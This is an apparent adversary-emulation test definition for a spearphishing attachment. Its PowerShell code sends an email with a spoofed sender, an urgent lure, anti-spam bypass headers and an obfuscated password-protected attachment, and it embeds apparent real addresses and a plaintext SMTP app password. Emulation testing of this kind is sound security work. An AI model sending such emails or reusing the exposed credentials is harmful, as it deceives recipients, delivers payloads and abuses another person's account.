attack_technique: T1566.001
display_name: 'Phishing: Spearphishing Attachment with Obfuscated Payload'
atomic_tests:
  - name: Send Phishing Email with Obfuscated Attachment (linked to T1027)
    auto_generated_guid: custom-guid-phishing-obfuscated-attachment
    description: |
      This test sends a phishing email using PowerShell with an obfuscated attachment generated from the T1027 technique.
      WARNING: FOR TESTING PURPOSES ONLY.
    supported_platforms:
      - windows
    input_arguments:
      smtp_server:
        description: SMTP server to use
        type: string
        default: "smtp.gmail.com"
      smtp_port:
        description: SMTP server port
        type: integer
        default: 587
      sender_email:
        description: Real email address for SMTP authentication
        type: string
        default: "chaymaoumayma2003@gmail.com"
      sender_visible_email:
        description: Visible "From" email address
        type: string
        default: "chaymabouattour1@gmail.com"
      recipient_email:
        description: Target recipient email address
        type: string
        default: "oumaymakabadou2@gmail.com"
      subject:
        description: Email subject
        type: string
        default: "‚ö†Ô∏è Important: Urgent Document Access Required"
      body:
        description: Email body (HTML allowed)
        type: string
        default: |
          Bonjour [Nom],

          Un document s√©curis√© a √©t√© g√©n√©r√© pour votre attention imm√©diate. Veuillez trouver ci-joint le fichier s√©curis√©.  
          **Instructions :** Renommez le fichier joint en `.zip`, puis utilisez le mot de passe `1234` pour l'ouvrir.

          Merci de votre collaboration,
          Service IT S√©curit√©
      attachment_path:
        description: Path to the obfuscated file generated by T1027
        type: string
        default: "C:\\temp\\MaskedAttachment.txt"  # Le fichier final renomm√© de T1027
      app_password:
        description: App password for SMTP authentication
        type: string
        default: "wbae yozc iyut rykk"
      malicious_link:
        description: Optional embedded phishing URL
        type: string
        default: "https://secure-documents.exemple.com"
      custom_headers:
        description: Custom SMTP headers to bypass anti-spam
        type: string
        default: |
          X-Priority: 1
          X-MSMail-Priority: High
          Importance: High
          X-Organization: SecureDocuments
          X-Mailer: Microsoft Outlook 16.0
      log_file:
        description: Path to save the email send logs
        type: string
        default: "C:\\temp\\phishing_logs.txt"
    executor:
      name: powershell
      elevation_required: false
      command: |
        $smtpServer = "#{smtp_server}"
        $smtpPort = "#{smtp_port}"
        $senderEmail = "#{sender_email}"
        $senderVisibleEmail = "#{sender_visible_email}"
        $recipientEmail = "#{recipient_email}"
        $subject = "#{subject}"
        $body = "#{body}"
        $attachmentPath = "#{attachment_path}"
        $securePassword = ConvertTo-SecureString "#{app_password}" -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential($senderEmail, $securePassword)

        # Parsing custom headers
        $headers = @{}
        foreach ($line in ("#{custom_headers}" -split "`n")) {
          if ($line.Trim() -ne "") {
            $parts = $line.Split(":", 2)
            if ($parts.Count -eq 2) {
              $headers[$parts[0].Trim()] = $parts[1].Trim()
            }
          }
        }

        Write-Host "üìß Envoi d'un email r√©el via SMTP avec attachement obfusqu√©..."
        try {
            Send-MailMessage -SmtpServer $smtpServer -Port $smtpPort -UseSsl `
                -From $senderVisibleEmail -To $recipientEmail `
                -Subject $subject -BodyAsHtml $body `
                -Attachments $attachmentPath -Credential $credential `
                -Headers $headers -ErrorAction Stop

            Write-Host "‚úÖ Email envoy√© avec succ√®s √† $recipientEmail."

            $logEntry = "[$(Get-Date)] Email envoy√© √† $recipientEmail avec succ√®s."
            Add-Content -Path "#{log_file}" -Value $logEntry
        } catch {
            Write-Host "‚ùå Erreur lors de l'envoi de l'email : $_"
            exit 1
        }
